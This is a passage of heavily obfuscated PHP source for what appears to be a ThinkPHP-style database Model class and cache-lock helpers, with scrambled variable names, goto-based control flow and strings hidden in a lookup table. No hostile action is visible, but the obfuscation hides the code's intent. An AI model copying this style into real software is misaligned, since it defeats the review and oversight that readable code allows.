$C¹ÊÖ™÷ƒ¤ = microtime(!0); $Aæ˜¯š”ôâ = $C¹ÊÖ™÷ƒ¤ + $E¡œÚº…£ï + 0.0001; goto D³„ øÍƒ; B™á¥¸İùê: } public function lockGet($Fïºİ¯Ë¯×) { $bë•ñº–äÑ =& $_SERVER[«¾°Ã¤]; $BÎÚ·ÓéÅÁ = rtrim(self::$cachePath, $bë•ñº–äÑ[8]) . $bë•ñº–äÑ[827] . md5($Fïºİ¯Ë¯×) . $bë•ñº–äÑ[824]; return file_exists($BÎÚ·ÓéÅÁ); } public function unlock($böĞ×®ñÈÑ) { goto b”îê™õöò; b”îê™õöò: $Cà³‚Ü¦”Ó =& $_SERVER[«¾°Ã¤]; $CÄ·ïÜñÙ¨ = self::$caches[$böĞ×®ñÈÑ]; if (!$CÄ·ïÜñÙ¨) { return; } goto f¸ÍÇ¸ÄÊ; aÑ¿Ÿ×İ‚: unset(self::$caches[$böĞ×®ñÈÑ]); goto b‘‡‚­Ñ™Ï; f¸ÍÇ¸ÄÊ: @flock($CÄ·ïÜñÙ¨[$Cà³‚Ü¦”Ó[829]], LOCK_UN); @fclose($CÄ·ïÜñÙ¨[$Cà³‚Ü¦”Ó[829]]); @unlink($CÄ·ïÜñÙ¨[$Cà³‚Ü¦”Ó[193]]); goto aÑ¿Ÿ×İ‚; b‘‡‚­Ñ™Ï: } } goto C§¨¥ÍÄÜ; F‹˜Ş¡Ä¯â: define($_SERVER[«¾°Ã¤][240], 0); define($_SERVER[«¾°Ã¤][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\157\162\x64\145\x72", "\141\x6c\x69\x61\x73", "\x68\x61\166\x69\x6e\x67", "\147\x72\157\165\160", "\154\x6f\x63\153", "\144\151\163\164\x69\x6e\143\164", "\141\x75\164\x6f", "\146\x69\154\164\145\162", "\166\141\154\x69\144\141\164\x65", "\162\145\163\x75\154\164", "\142\151\x6e\x64", "\x74\157\153\145\156"); public function __construct($bØ®Ş¶ÆÉ‡ = '', $CªàÒéµ¥ = '', $B ­³º¡£ˆ = '') { $dËÉÖñˆâ =& $_SERVER[«¾°Ã¤]; $this->_initialize(); if (!empty($bØ®Ş¶ÆÉ‡)) { if (strpos($bØ®Ş¶ÆÉ‡, $dËÉÖñˆâ[95])) { list($this->dbName, $this->name) = explode($dËÉÖñˆâ[95], $bØ®Ş¶ÆÉ‡); } else { $this->name = $bØ®Ş¶ÆÉ‡; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($CªàÒéµ¥)) { $this->tablePrefix = $dËÉÖñˆâ[33]; } elseif ($dËÉÖñˆâ[33] != $CªàÒéµ¥) { $this->tablePrefix = $CªàÒéµ¥; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($dËÉÖñˆâ[242]); } $this->db(0, empty($this->connection) ? $B ­³º¡£ˆ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $b‹†ì©ë² =& $_SERVER[«¾°Ã¤]; if (empty($this->fields)) { if (think_config($b‹†ì©ë²[243])) { $fä˜…½„œõ = $this->dbName ? $this->dbName : think_config($b‹†ì©ë²[244]); $eŸ ÌôªºÊ = think_var_cache($b‹†ì©ë²[245] . strtolower(get_path_this($fä˜…½„œõ) . $b‹†ì©ë²[95] . $this->name)); if ($eŸ ÌôªºÊ) { $F–ˆ£ÜÄÄê = think_config($b‹†ì©ë²[246]); if (empty($F–ˆ£ÜÄÄê) || $eŸ ÌôªºÊ[$b‹†ì©ë²[247]] == $F–ˆ£ÜÄÄê) { $this->fields = $eŸ ÌôªºÊ; return; } } } $this->flush(); } } public function flush() { goto e…ÆÄ©’; AÍîà¨¢ï¹: if (!$d—‚Í„„¹Ú) { return !1; } $this->fields = array_keys($d—‚Í„„¹Ú); $this->fields[$bÖˆøÇÊ†[248]] = !1; goto Föê›õá¬; Föê›õá¬: foreach ($d—‚Í„„¹Ú as $FÂ‹Ãä© => $CÖƒÃ‚¹) { $DÇÍÊ™è­­[$FÂ‹Ãä©] = $CÖƒÃ‚¹[$bÖˆøÇÊ†[29]]; if ($CÖƒÃ‚¹[$bÖˆøÇÊ†[36]]) { $this->fields[$bÖˆøÇÊ†[249]] = $FÂ‹Ãä©; if ($CÖƒÃ‚¹[$bÖˆøÇÊ†[39]]) { $this->fields[$bÖˆøÇÊ†[248]] = !0; } } } $this->fields[$bÖˆøÇÊ†[250]] = $DÇÍÊ™è­­; if (think_config($bÖˆøÇÊ†[246])) { $this->fields[$bÖˆøÇÊ†[247]] = think_config($bÖˆøÇÊ†[246]); } goto c‡‹£Ë…›; e…ÆÄ©’: $bÖˆøÇÊ† =& $_SERVER[«¾°Ã¤]; $this->db->setModel($this->name); $d—‚Í„„¹Ú = $this->db->getFields($this->getTableName()); goto AÍîà¨¢ï¹; c‡‹£Ë…›: if (think_config($bÖˆøÇÊ†[243])) { $fØ¯ƒö½¸Â = $this->dbName ? $this->dbName : think_config($bÖˆøÇÊ†[244]); think_var_cache($bÖˆøÇÊ†[245] . strtolower(get_path_this($fØ¯ƒö½¸Â) . $bÖˆøÇÊ†[95] . $this->name), $this->fields); } goto d„ÂÇÃ¾â®; d„ÂÇÃ¾â®: } public function switchModel($Aó‰šÄŒª­, $FèÓÆ»è¥´ = array()) { $c¿Åô ¿ºã =& $_SERVER[«¾°Ã¤]; $E¨¼”¸‡•Ë = ucwords(strtolower($Aó‰šÄŒª­)) . $c¿Åô ¿ºã[251]; if (!class_exists($E¨¼”¸‡•Ë)) { think_exception($E¨¼”¸‡•Ë . think_lang($c¿Åô ¿ºã[252])); } $this->_extModel = new $E¨¼”¸‡•Ë($this->name); if (!empty($FèÓÆ»è¥´)) { foreach ($FèÓÆ»è¥´ as $AåÙœ¤ùô‡) { $this->_extModel->setProperty($AåÙœ¤ùô‡, $this->{$AåÙœ¤ùô‡}); } } return $this->_extModel; } public function __set($f·–ˆ¹Ä˜Ô, $f‘¢ÆĞŠƒ›) { $this->data[$f·–ˆ¹Ä˜Ô] = $f‘¢ÆĞŠƒ›; } public function __get($CÜ¯²ŒÉ©Ÿ) { return isset($this->data[$CÜ¯²ŒÉ©Ÿ]) ? $this->data[$CÜ¯²ŒÉ©Ÿ] : null; } public function __isset($eÇµœâ­ÁÆ) { return isset($this->data[$eÇµœâ­ÁÆ]); } public function __unset($cåÔ Á¾÷˜) { unset($this->data[$cåÔ Á¾÷˜]); } public function __call($Bê÷‹ÈîßÕ, $dÓ¡©™éµ¢) { $d…ÀÏæ¶ÎÔ =& $_SERVER[«¾°Ã¤]; if (in_array(strtolower($Bê÷‹ÈîßÕ), $this->methods, !0)) { $this->options[strtolower($Bê÷‹ÈîßÕ)] = $dÓ¡©™éµ¢[0]; return $this; } elseif (in_array(strtolower($Bê÷‹ÈîßÕ), array($d…ÀÏæ¶ÎÔ[253], $d…ÀÏæ¶ÎÔ[254], $d…ÀÏæ¶ÎÔ[255], $d…ÀÏæ¶ÎÔ[256], $d…ÀÏæ¶ÎÔ[257]), !0)) { $EÖ‰à°„¬ = isset($dÓ¡©™éµ¢[0]) ? $dÓ¡©™éµ¢[0] : $d…ÀÏæ¶ÎÔ[182]; $EÖ‰à°„¬ = $this->db->parseKey($EÖ‰à°„¬); return $this->getField(strtoupper($Bê÷‹ÈîßÕ) . $d…ÀÏæ¶ÎÔ[258] . $EÖ‰à°„¬ . $d…ÀÏæ¶ÎÔ[259] . $Bê÷‹ÈîßÕ, $d…ÀÏæ¶ÎÔ[253]); } elseif (strtolower(substr($Bê÷‹ÈîßÕ, 0, 5)) == $d…ÀÏæ¶ÎÔ[260]) { $EÖ‰à°„¬ = think_parse_name(substr($Bê÷‹ÈîßÕ, 5)); $f“¿ğ¦Ùòì[$EÖ‰à°„¬] = $dÓ¡©™éµ¢[0]; return $this->where($f“¿ğ¦Ùòì)->find(); } elseif (strtolower(substr($Bê÷‹ÈîßÕ, 0, 10)) == $d…ÀÏæ¶ÎÔ[261]) { $C˜—µ£·‰„ = think_parse_name(substr($Bê÷‹ÈîßÕ, 10)); $f“¿ğ¦Ùòì[$C˜—µ£·‰„] = $dÓ¡©™éµ¢[0]; return $this->where($f“¿ğ¦Ùòì)->getField($dÓ¡©™éµ¢[1]); } elseif (isset($this->_scope[$Bê÷‹ÈîßÕ])) { return $this->scope($Bê÷‹ÈîßÕ, $dÓ¡©™éµ¢[0]); } elseif (method_exists($this, $Bê÷‹ÈîßÕ)) { array_unshift($dÓ¡©™éµ¢, $Bê÷‹ÈîßÕ); return call_user_func_array(array($this, $d…ÀÏæ¶ÎÔ[262]), $dÓ¡©™éµ¢); } else { return call_user_func_array(array(parent, $Bê÷‹ÈîßÕ), $dÓ¡©™éµ¢); } } protected function call() { goto cÕÌ¤…Âô; cÕÌ¤…Âô: $f‡“ëëƒÇç =& $_SERVER[«¾°Ã¤]; $aºò³àßĞ‡ = func_get_args(); $dí‡Šâ×†® = array_shift($aºò³àßĞ‡); goto d·Ä‘Ìğê; d·Ä‘Ìğê: $DôÍ¨¥¬°é = $dí‡Šâ×†®; if (is_array($dí‡Šâ×†®)) { $DôÍ¨¥¬°é = $dí‡Šâ×†®[1]; $dí‡Šâ×†® = $dí‡Šâ×†®[0]; } $e¥¿á¨¦Ë = count($aºò³àßĞ‡) - 1; goto d«ÀÀÌµ•ò; AÀˆ¶¦ºƒ: $Fï¹¶™À­Û = call_user_func_array(array($this, $dí‡Šâ×†®), $aºò³àßĞ‡); if (method_exists($this, $f‡“ëëƒÇç[266])) { $BÃ´¥ŒÃ£¥ = call_user_func_array(array($this, $f‡“ëëƒÇç[267]), array($DôÍ¨¥¬°é, $aºò³àßĞ‡, $Fï¹¶™À­Û)); if ($BÃ´¥ŒÃ£¥) { return $BÃ´¥ŒÃ£¥; } } return $Fï¹¶™À­Û; goto c±Æ¸¯†”’; d«ÀÀÌµ•ò: if (isset($aºò³àßĞ‡[$e¥¿á¨¦Ë]) && $aºò³àßĞ‡[$e¥¿á¨¦Ë] === $dí‡Šâ×†®) { think_exception(__CLASS__ . $f‡“ëëƒÇç[4] . $dí‡Šâ×†® . think_lang($f‡“ëëƒÇç[263])); return; } $aºò³àßĞ‡[] = $dí‡Šâ×†®; if (method_exists($this, $f‡“ëëƒÇç[264])) { $BÃ´¥ŒÃ£¥ = call_user_func_array(array($this, $f‡“ëëƒÇç[265]), array($DôÍ¨¥¬°é, $aºò³àßĞ‡)); if (!is_null($BÃ´¥ŒÃ£¥) && $BÃ´¥ŒÃ£¥ !== !1) { return $BÃ´¥ŒÃ£¥; } } goto AÀˆ¶¦ºƒ; c±Æ¸¯†”’: } protected function _initialize() { } protected function _facade($Cæ‘óŒöä®) { $Dëñá­Ç¬ª =& $_SERVER[«¾°Ã¤]; if (!empty($this->fields)) { foreach ($Cæ‘óŒöä® as $D¼Ï•º¿¦¶ => $dáŒŸ‡Š) { if (is_array($this->fields) && !in_array($D¼Ï•º¿¦¶, $this->fields, !0)) { unset($Cæ‘óŒöä®[$D¼Ï•º¿¦¶]); } elseif (is_scalar($dáŒŸ‡Š)) { $this->_parseType($Cæ‘óŒöä®, $D¼Ï•º¿¦¶); } } } if (!empty($this->options[$Dëñá­Ç¬ª[268]])) { $Cæ‘óŒöä® = array_map($this->options[$Dëñá­Ç¬ª[268]], $Cæ‘óŒöä®); unset($this->options[$Dëñá­Ç¬ª[268]]); } $this->_beforeWrite($Cæ‘óŒöä®); return $Cæ‘óŒöä®; } protected function _beforeWrite(&$A¨Ï…ß°Ş÷) { } public function add($EÕ¯‹ƒÍÍ = '', $DƒËø…»ˆµ = array(), $Fëäğ¼³ãÜ = false) { goto F¼ƒ†Õ±êƒ; F¼ƒ†Õ±êƒ: if (empty($EÕ¯‹ƒÍÍ)) { if (!empty($this->data)) { $EÕ¯‹ƒÍÍ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[«¾°Ã¤][269]); return !1; } } $DƒËø…»ˆµ = $this->_parseOptions($DƒËø…»ˆµ); $EÕ¯‹ƒÍÍ = $this->_facade($EÕ¯‹ƒÍÍ); goto Aˆ„ª»®™; Aˆ„ª»®™: if (!1 === $this->_beforeInsert($EÕ¯‹ƒÍÍ, $DƒËø…»ˆµ)) { return !1; } $E°Î®¾»ñ = $this->db->insert($EÕ¯‹ƒÍÍ, $DƒËø…»ˆµ, $Fëäğ¼³ãÜ); if (!1 !== $E°Î®¾»ñ) { $d¸Üî‘µ´ = $this->getLastInsID(); if ($d¸Üî‘µ´) { $EÕ¯‹ƒÍÍ[$this->getPk()] = $d¸Üî‘µ´; $this->_after_insert($EÕ¯‹ƒÍÍ, $DƒËø…»ˆµ); return $d¸Üî‘µ´; } $this->_after_insert($EÕ¯‹ƒÍÍ, $DƒËø…»ˆµ); } goto aÏèëùåø; aÏèëùåø: return $E°Î®¾»ñ; goto CÇ½ÀÓëÍ; CÇ½ÀÓëÍ: } protected function _beforeInsert(&$c‰›Î°ĞåÌ, $eäáÛÇ¯å”) { } protected function _after_insert($f¹ÖŸ‹æø, $dÙÀªîµÑ½) { } public function addAll($Aâ°©ÇÚÑŒ, $CÖÁåÁëÇ = array(), $EÂ­¿‚•ÄÁ = false) { goto Aó—²ÔˆÓ…; d±Å§„öĞ™: return $D¯¤ò…Àö—; goto f¬“‹Õõİ; Aó—²ÔˆÓ…: $DØí¢áº¸Ï =& $_SERVER[«¾°Ã¤]; if (empty($Aâ°©ÇÚÑŒ)) { $this->error = think_lang($DØí¢áº¸Ï[269]); return !1; } $CÖÁåÁëÇ = $this->_parseOptions($CÖÁåÁëÇ); goto FÀ°ŞÕÏî…; FÀ°ŞÕÏî…: foreach ($Aâ°©ÇÚÑŒ as $eÍª°öò«÷ => $e·Õê‚ ¶¶) { $Aâ°©ÇÚÑŒ[$eÍª°öò«÷] = $this->_facade($e·Õê‚ ¶¶); } if (method_exists($this->db, $DØí¢áº¸Ï[270])) { $D¯¤ò…Àö— = $this->db->insertAll($Aâ°©ÇÚÑŒ, $CÖÁåÁëÇ, $EÂ­¿‚•ÄÁ); } else { $this->startTrans(); foreach ($Aâ°©ÇÚÑŒ as $eÍª°öò«÷ => $e·Õê‚ ¶¶) { $D¯¤ò…Àö— = $this->db->insert($e·Õê‚ ¶¶, $CÖÁåÁëÇ, $EÂ­¿‚•ÄÁ); } $this->commit(); } if (!1 !== $D¯¤ò…Àö—) { $Aİ¬Î’’Ğ¿ = $this->getLastInsID(); if ($Aİ¬Î’’Ğ¿) { return $Aİ¬Î’’Ğ¿; } } goto d±Å§„öĞ™; f¬“‹Õõİ: } public function selectAdd($b³õÃÒÍ­… = '', $d—£‰åÜ£ç = '', $E»÷‚àÇŠ = array()) { $AßÀ–îÒê· =& $_SERVER[«¾°Ã¤]; $E»÷‚àÇŠ = $this->_parseOptions($E»÷‚àÇŠ); if (!1 === ($cÎ£„ˆÛª« = $this->db->selectInsert($b³õÃÒÍ­… ? $b³õÃÒÍ­… : $E»÷‚àÇŠ[$AßÀ–îÒê·[271]], $d—£‰åÜ£ç ? $d—£‰åÜ£ç : $this->getTableName(), $E»÷‚àÇŠ))) { $this->error = think_lang($AßÀ–îÒê·[272]); return !1; } else { return $cÎ£„ˆÛª«; } } public function save($F‚ÎÏÌöíÑ = '', $Fêó–ÈÂ“Ÿ = array()) { goto C›ß›é†ñ…; C˜¦İÌ’Ôˆ: if (!1 !== $e¯±œàÒêº) { if (isset($BÛÓİÑ”„Ù)) { $F‚ÎÏÌöíÑ[$Bãîâ¢óµí] = $BÛÓİÑ”„Ù; } $this->_afterUpdate($F‚ÎÏÌöíÑ, $Fêó–ÈÂ“Ÿ); } return $e¯±œàÒêº; goto A›®œŠÍÇ; d½§òÕ˜§¦: $Fêó–ÈÂ“Ÿ = $this->_parseOptions($Fêó–ÈÂ“Ÿ); $Bãîâ¢óµí = $this->getPk(); if (!isset($Fêó–ÈÂ“Ÿ[$CôÍŠ…ô«‰[273]])) { if (isset($F‚ÎÏÌöíÑ[$Bãîâ¢óµí])) { $AÏ˜ê”Ã‘£[$Bãîâ¢óµí] = $F‚ÎÏÌöíÑ[$Bãîâ¢óµí]; $Fêó–ÈÂ“Ÿ[$CôÍŠ…ô«‰[273]] = $AÏ˜ê”Ã‘£; unset($F‚ÎÏÌöíÑ[$Bãîâ¢óµí]); } else { $this->error = think_lang($CôÍŠ…ô«‰[272]); return !1; } } goto FÊééá¦šµ; C›ß›é†ñ…: $CôÍŠ…ô«‰ =& $_SERVER[«¾°Ã¤]; if (empty($F‚ÎÏÌöíÑ)) { if (!empty($this->data)) { $F‚ÎÏÌöíÑ = $this->data; $this->data = array(); } else { $this->error = think_lang($CôÍŠ…ô«‰[269]); return !1; } } $F‚ÎÏÌöíÑ = $this->_facade($F‚ÎÏÌöíÑ); goto d½§òÕ˜§¦; FÊééá¦šµ: if (is_array($Fêó–ÈÂ“Ÿ[$CôÍŠ…ô«‰[273]]) && isset($Fêó–ÈÂ“Ÿ[$CôÍŠ…ô«‰[273]][$Bãîâ¢óµí])) { $BÛÓİÑ”„Ù = $Fêó–ÈÂ“Ÿ[$CôÍŠ…ô«‰[273]][$Bãîâ¢óµí]; } if (!1 === $this->_beforeUpdate($F‚ÎÏÌöíÑ, $Fêó–ÈÂ“Ÿ)) { return !1; } $e¯±œàÒêº = $this->db->update($F‚ÎÏÌöíÑ, $Fêó–ÈÂ“Ÿ); goto C˜¦İÌ’Ôˆ; A›®œŠÍÇ: } protected function _beforeUpdate(&$Bõô»±™Ãğ, $EÎŒµ“Œî) { } protected function _afterUpdate($fÑåã³™Ï, $E±ëŸî›ö½) { } public function delete($FŞ×£å‘©Ø = array()) { goto C»ã˜¯ŠÄ; bœĞæµŞë: if (is_numeric($FŞ×£å‘©Ø) || is_string($FŞ×£å‘©Ø)) { if (strpos($FŞ×£å‘©Ø, $AÃ¬¶âÜÓª[47])) { $B¿··¡‘¼[$aÌ§ÕöÁ¯°] = array($AÃ¬¶âÜÓª[274], $FŞ×£å‘©Ø); } else { $B¿··¡‘¼[$aÌ§ÕöÁ¯°] = $FŞ×£å‘©Ø; } $this->options[$AÃ¬¶âÜÓª[273]] = $B¿··¡‘¼; } $FŞ×£å‘©Ø = $this->_parseOptions(); if (is_array($FŞ×£å‘©Ø[$AÃ¬¶âÜÓª[273]]) && isset($FŞ×£å‘©Ø[$AÃ¬¶âÜÓª[273]][$aÌ§ÕöÁ¯°])) { $DŒ»»ê»ò¡ = $FŞ×£å‘©Ø[$AÃ¬¶âÜÓª[273]][$aÌ§ÕöÁ¯°]; } goto E¥—¸åŒšŞ; E¥—¸åŒšŞ: $fšñ…•Œ– = $this->db->delete($FŞ×£å‘©Ø); if (!1 !== $fšñ…•Œ–) { $aÀº™ÒÄŸ  = array(); if (isset($DŒ»»ê»ò¡)) { $aÀº™ÒÄŸ [$aÌ§ÕöÁ¯°] = $DŒ»»ê»ò¡; } $this->_after_delete($aÀº™ÒÄŸ , $FŞ×£å‘©Ø); } return $fšñ…•Œ–; goto bì¿óÙì; C»ã˜¯ŠÄ: $AÃ¬¶âÜÓª =& $_SERVER[«¾°Ã¤]; if (empty($FŞ×£å‘©Ø) && empty($this->options[$AÃ¬¶âÜÓª[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aÌ§ÕöÁ¯° = $this->getPk(); goto bœĞæµŞë; bì¿óÙì: } protected function _after_delete($DŞÅèã¬Ï, $cô£Æç·Ò«) { } public function select($A‰ìÒËÍÕ = array()) { goto cÉ…¶Ğ¯ùì; cÉ…¶Ğ¯ùì: $B„©¬ªÏ­„ =& $_SERVER[«¾°Ã¤]; if (is_string($A‰ìÒËÍÕ) || is_numeric($A‰ìÒËÍÕ)) { $Cíİ¦Âê‘ = $this->getPk(); if (strpos($A‰ìÒËÍÕ, $B„©¬ªÏ­„[47])) { $dÂÅËÕŠ­[$Cíİ¦Âê‘] = array($B„©¬ªÏ­„[274], $A‰ìÒËÍÕ); } else { $dÂÅËÕŠ­[$Cíİ¦Âê‘] = $A‰ìÒËÍÕ; } $this->options[$B„©¬ªÏ­„[273]] = $dÂÅËÕŠ­; } elseif (!1 === $A‰ìÒËÍÕ) { $A‰ìÒËÍÕ = $this->_parseOptions(); return $B„©¬ªÏ­„[275] . $this->db->buildSelectSql($A‰ìÒËÍÕ) . $B„©¬ªÏ­„[276]; } $A‰ìÒËÍÕ = $this->_parseOptions(); goto aë§©ˆâ¯Æ; aë§©ˆâ¯Æ: $cŸæˆßÌ£¤ = $this->db->select($A‰ìÒËÍÕ); if (!1 === $cŸæˆßÌ£¤) { return !1; } if (empty($cŸæˆßÌ£¤)) { return null; } goto a˜Æ¦­¸Ä; a˜Æ¦­¸Ä: $this->_afterSelect($cŸæˆßÌ£¤, $A‰ìÒËÍÕ); return $cŸæˆßÌ£¤; goto c²Õ©‰§…½; c²Õ©‰§…½: } protected function _afterSelect(&$BŞ·ê¥‡Õ‘, $B”­¾Æ–Ú) { } public function buildSql($D·ĞÔë‹áÌ = array()) { $FïĞØ†ß  =& $_SERVER[«¾°Ã¤]; $D·ĞÔë‹áÌ = $this->_parseOptions($D·ĞÔë‹áÌ); return $FïĞØ†ß [275] . $this->db->buildSelectSql($D·ĞÔë‹áÌ) . $FïĞØ†ß [276]; } public function optionsValue($c˜ëëŞËÔ = null) { if (is_null($c˜ëëŞËÔ)) { return $this->options; } elseif (is_array($c˜ëëŞËÔ)) { $this->options = array_merge($this->options, $c˜ëëŞËÔ); } } protected function _parseOptions($D½æÒóß“Œ = array()) { goto f·«Ÿë›Á‚; DÖÒĞÅ’’: if (isset($D½æÒóß“Œ[$C«¡öŒ¶[273]]) && is_array($D½æÒóß“Œ[$C«¡öŒ¶[273]]) && !empty($B…ˆ…¨……Ë) && !isset($D½æÒóß“Œ[$C«¡öŒ¶[280]]) && !isset($D½æÒóß“Œ[$C«¡öŒ¶[277]])) { foreach ($D½æÒóß“Œ[$C«¡öŒ¶[273]] as $aÉÉÆ¨°› => $FŠÈöšºïÁ) { $aÉÉÆ¨°› = trim($aÉÉÆ¨°›); if (in_array($aÉÉÆ¨°›, $B…ˆ…¨……Ë, !0)) { if (is_scalar($FŠÈöšºïÁ)) { $this->_parseType($D½æÒóß“Œ[$C«¡öŒ¶[273]], $aÉÉÆ¨°›); } } elseif (!is_numeric($aÉÉÆ¨°›) && $C«¡öŒ¶[71] != substr($aÉÉÆ¨°›, 0, 1) && !1 === strpos($aÉÉÆ¨°›, $C«¡öŒ¶[95]) && !1 === strpos($aÉÉÆ¨°›, $C«¡öŒ¶[258]) && !1 === strpos($aÉÉÆ¨°›, $C«¡öŒ¶[281]) && !1 === strpos($aÉÉÆ¨°›, $C«¡öŒ¶[282])) { unset($D½æÒóß“Œ[$C«¡öŒ¶[273]][$aÉÉÆ¨°›]); } } } $this->_options_filter($D½æÒóß“Œ); return $D½æÒóß“Œ; goto b³æ¢ÉÉ»ƒ; eÊÄÍ§Š†Ê: if (!isset($D½æÒóß“Œ[$C«¡öŒ¶[277]])) { $D½æÒóß“Œ[$C«¡öŒ¶[277]] = $this->getTableName(); $B…ˆ…¨……Ë = $this->fields; } else { $B…ˆ…¨……Ë = $this->getDbFields(); } if (!empty($D½æÒóß“Œ[$C«¡öŒ¶[278]])) { $D½æÒóß“Œ[$C«¡öŒ¶[277]] .= $C«¡öŒ¶[50] . $D½æÒóß“Œ[$C«¡öŒ¶[278]]; } $D½æÒóß“Œ[$C«¡öŒ¶[279]] = $this->name; goto DÖÒĞÅ’’; f·«Ÿë›Á‚: $C«¡öŒ¶ =& $_SERVER[«¾°Ã¤]; if (is_array($D½æÒóß“Œ)) { $D½æÒóß“Œ = array_merge($this->options, $D½æÒóß“Œ); } $this->options = array(); goto eÊÄÍ§Š†Ê; b³æ¢ÉÉ»ƒ: } protected function _options_filter(&$e™‚Æ¯â¤) { } protected function _parseType(&$eÖãÔ¬£…¸, $Dä„âÌ ‡–) { $c¾Ÿ¾ÒÊ÷ =& $_SERVER[«¾°Ã¤]; if (empty($this->options[$c¾Ÿ¾ÒÊ÷[283]][$c¾Ÿ¾ÒÊ÷[4] . $Dä„âÌ ‡–])) { $A±²£‹¼Õ = strtolower($this->fields[$c¾Ÿ¾ÒÊ÷[250]][$Dä„âÌ ‡–]); if (!1 !== strpos($A±²£‹¼Õ, $c¾Ÿ¾ÒÊ÷[284])) { } elseif (!1 === strpos($A±²£‹¼Õ, $c¾Ÿ¾ÒÊ÷[285]) && !1 !== strpos($A±²£‹¼Õ, $c¾Ÿ¾ÒÊ÷[286])) { $eÖãÔ¬£…¸[$Dä„âÌ ‡–] = intval($eÖãÔ¬£…¸[$Dä„âÌ ‡–]); } elseif (!1 !== strpos($A±²£‹¼Õ, $c¾Ÿ¾ÒÊ÷[287]) || !1 !== strpos($A±²£‹¼Õ, $c¾Ÿ¾ÒÊ÷[288])) { $eÖãÔ¬£…¸[$Dä„âÌ ‡–] = floatval($eÖãÔ¬£…¸[$Dä„âÌ ‡–]); } elseif (!1 !== strpos($A±²£‹¼Õ, $c¾Ÿ¾ÒÊ÷[289])) { $eÖãÔ¬£…¸[$Dä„âÌ ‡–] = (bool) $eÖãÔ¬£…¸[$Dä„âÌ ‡–]; } } } public function find($F²™©Şˆ‚™ = array()) { goto f†®ëˆ‘È; f†®ëˆ‘È: $Cñƒæ›Æ‰Ë =& $_SERVER[«¾°Ã¤]; if (is_numeric($F²™©Şˆ‚™) || is_string($F²™©Şˆ‚™)) { $DùÑ‚«ˆáÛ[$this->getPk()] = intval($F²™©Şˆ‚™); $this->options[$Cñƒæ›Æ‰Ë[273]] = $DùÑ‚«ˆáÛ; } $this->options[$Cñƒæ›Æ‰Ë[290]] = 1; goto Dìˆø§õš§; Dìˆø§õš§: $F²™©Şˆ‚™ = $this->_parseOptions(); $fë÷â›¤ = $this->db->select($F²™©Şˆ‚™); if (!1 === $fë÷â›¤) { return !1; } goto c©©“³–ÇÖ; fò«ß¹¡õÉ: if (!empty($this->options[$Cñƒæ›Æ‰Ë[291]])) { return $this->returnResult($this->data, $this->options[$Cñƒæ›Æ‰Ë[291]]); } return $this->data; goto eë¢Œ­œÜ; c©©“³–ÇÖ: if (empty($fë÷â›¤)) { return null; } $this->data = $fë÷â›¤[0]; $this->_afterFind($this->data, $F²™©Şˆ‚™); goto fò«ß¹¡õÉ; eë¢Œ­œÜ: } protected function _afterFind(&$e£ÂÍ«¡¨, $D×ßÉçïšÀ) { } protected function returnResult($C‰—Ğ¨“², $eËğ†­áÛƒ = '') { $A…ßÈ‘‘´œ =& $_SERVER[«¾°Ã¤]; if ($eËğ†­áÛƒ) { if (is_callable($eËğ†­áÛƒ)) { return call_user_func($eËğ†­áÛƒ, $C‰—Ğ¨“²); } switch (strtolower($eËğ†­áÛƒ)) { case $A…ßÈ‘‘´œ[292]: return json_encode($C‰—Ğ¨“²); case $A…ßÈ‘‘´œ[293]: return xml_encode($C‰—Ğ¨“²); } } return $C‰—Ğ¨“²; } public function parseFieldsMap($c…È™Ÿ–àÌ, $a‰¹ÎÛº’™ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $d×À»Ô¬èï => $E‘ËæóÉ) { if ($a‰¹ÎÛº’™ == 1) { if (isset($c…È™Ÿ–àÌ[$E‘ËæóÉ])) { $c…È™Ÿ–àÌ[$d×À»Ô¬èï] = $c…È™Ÿ–àÌ[$E‘ËæóÉ]; unset($c…È™Ÿ–àÌ[$E‘ËæóÉ]); } } else { if (isset($c…È™Ÿ–àÌ[$d×À»Ô¬èï])) { $c…È™Ÿ–àÌ[$E‘ËæóÉ] = $c…È™Ÿ–àÌ[$d×À»Ô¬èï]; unset($c…È™Ÿ–àÌ[$d×À»Ô¬èï]); } } } } return $c…È™Ÿ–àÌ; } public function setField($eÀÚéïìÀ, $aÍ‡Œ•ª¸ = '') { if (is_array($eÀÚéïìÀ)) { $aŞ¨¡æÜ¯ = $eÀÚéïìÀ; } else { $aŞ¨¡æÜ¯[$eÀÚéïìÀ] = $aÍ‡Œ•ª¸; } return $this->save($aŞ¨¡æÜ¯); } public function setAdd($eŸ£µ»†Â·, $eø‰Û¥êØÃ = 1) { $eàÑìáŠòì =& $_SERVER[«¾°Ã¤]; $DÑ³¬ËçôŸ = $eŸ£µ»†Â· . $eàÑìáŠòì[294] . $eø‰Û¥êØÃ; if ($eø‰Û¥êØÃ < 0) { $DÑ³¬ËçôŸ = $eŸ£µ»†Â· . $eø‰Û¥êØÃ; } return $this->setField($eŸ£µ»†Â·, array($eàÑìáŠòì[295], $DÑ³¬ËçôŸ)); } public function getField($EÑª“ÓóŞ¸, $fÀ…åø¯’á = null) { $a†ÛÄÄ¡–Ğ =& $_SERVER[«¾°Ã¤]; $A¹‹È‡Â««[$a†ÛÄÄ¡–Ğ[271]] = $EÑª“ÓóŞ¸; $A¹‹È‡Â«« = $this->_parseOptions($A¹‹È‡Â««); $EÑª“ÓóŞ¸ = trim($EÑª“ÓóŞ¸); if (strpos($EÑª“ÓóŞ¸, $a†ÛÄÄ¡–Ğ[47])) { if (!isset($A¹‹È‡Â««[$a†ÛÄÄ¡–Ğ[290]])) { $A¹‹È‡Â««[$a†ÛÄÄ¡–Ğ[290]] = is_numeric($fÀ…åø¯’á) ? $fÀ…åø¯’á : $a†ÛÄÄ¡–Ğ[33]; } 